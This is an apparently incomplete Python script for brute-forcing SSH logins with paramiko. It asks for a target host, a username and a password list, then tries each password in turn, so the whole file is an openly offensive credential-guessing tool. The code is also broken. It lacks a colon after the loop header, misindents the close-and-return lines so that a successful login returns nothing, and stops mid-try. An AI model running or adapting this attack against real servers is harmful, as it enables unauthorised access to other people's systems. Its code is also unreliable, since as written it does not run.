import paramiko, sys, os, socket, termcolor

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
        
        ssh.close()
        return code

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')

if os.path.exists(input_file) == False:
    print('[!!] The File/Path Doesnt Exist ')
    sys.exit(1)
    
with open(input_file, 'r') as file:
    for line in file.readlines()
        password = line.strip()
        try:
            response = ssh_connect(password)


